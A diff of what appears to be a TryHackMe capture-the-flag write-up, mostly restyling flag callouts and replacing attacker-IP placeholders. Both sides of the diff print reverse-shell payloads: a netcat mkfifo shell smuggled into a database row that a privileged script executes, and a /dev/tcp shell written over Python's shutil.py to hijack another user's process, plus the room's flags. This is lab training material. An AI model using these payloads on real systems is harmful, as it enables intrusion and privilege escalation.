@@ -282,8 +282,7 @@ lucien@ip-10-48-141-179:~$ cat lucien_flag.txt
 THM{TH3_L1BR4R14N}
 ```
 
-> [!Flag]
-> THM{TH3_L1BR4R14N}
+> [!Important] Flag for Lucien: `THM{TH3_L1BR4R14N}`
 
 We can see the user `lucien` can execute the `getDeath.py` file without any password require as user `death`....
 
@@ -430,7 +429,7 @@ mysql> SELECT * from dreams;
 Here we can add another row/record with values as ('D3ath, rev-shell'), like given below
 
 > ```sql
-> INSERT INTO dreams (dreamer, dream) VALUES ('D3ath', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f)');
+> INSERT INTO dreams (dreamer, dream) VALUES ('D3ath', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKBOX_IP> 4444 >/tmp/f)');
 > ```
 
 Which will return OK if done correctly!
@@ -449,7 +448,7 @@ Now we have our reverse shell entry at the bottom which will be executed once we
 | Bob     | Exploring ancient ruins                                                               |
 | Carol   | Becoming a successful entrepreneur                                                    |
 | Dave    | Becoming a professional musician                                                      |
-| D3ath   | $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MY_IP 4444 >/tmp/f) |
+| D3ath   | $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKBOX_IP> 4444 >/tmp/f) |
 +---------+---------------------------------------------------------------------------------------+
 5 rows in set (0.00 sec)
 ```
@@ -459,7 +458,7 @@ We got the shell as user `death`
 ```bash
 ❯ nc -nvlp 4444
 listening on [any] 4444 ...
-connect to [MY_IP] from (UNKNOWN) [10.48.141.179] 45902
+connect to [<ATTACKBOX_IP>] from (UNKNOWN) [10.48.141.179] 45902
 $ which python3
 /usr/bin/python3
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -475,8 +474,8 @@ THM{1M_TH3R3_4_TH3M}
 
 Hence we got our next flag which is:
 
-> [!Flag] Flag for Death
-> THM{1M_TH3R3_4_TH3M}
+> [!Important]
+> Flag for Death: `THM{1M_TH3R3_4_TH3M}`
 
 While checking `morpheus` dir. we can see one python file named `restore.py` which has the given contents:
 
@@ -490,7 +489,7 @@ backup(src_file, dst_file)
 print("The kingdom backup has been done!")
 ```
 
-Now after searching through google I found that the user `morpheus` is running the file `restore.py` (live).
+Now after searching through live processes on the system, I found that the user `morpheus` is running the file `restore.py`.
 
 ```bash
 CMD: UID=1002  PID=5981   | /usr/bin/python3.8 /home/morpheus/restore.py
@@ -510,7 +509,7 @@ death@ip-10-48-141-179:~$ find / -type f -not -path "/proc/*" -not -path "/sys/*
 Thus we can edit `/usr/lib/python3.8/shutil.py` let's append our reverse shell
 
 ```reverse-shell
-echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/YOUR_IP/4445 0>&1'\")" > /usr/lib/python3.8/shutil.py
+echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/<ATTACKBOX_IP>/4445 0>&1'\")" > /usr/lib/python3.8/shutil.py
 ```
 
 And we got the shell....
@@ -537,5 +536,5 @@ cat morpheus_flag.txt
 THM{DR34MS_5H4P3_TH3_W0RLD}
 ```
 
-> [!flag] Final Flag
-> THM{DR34MS_5H4P3_TH3_W0RLD}
+> [!Important]
+> Final Flag: `THM{DR34MS_5H4P3_TH3_W0RLD}`
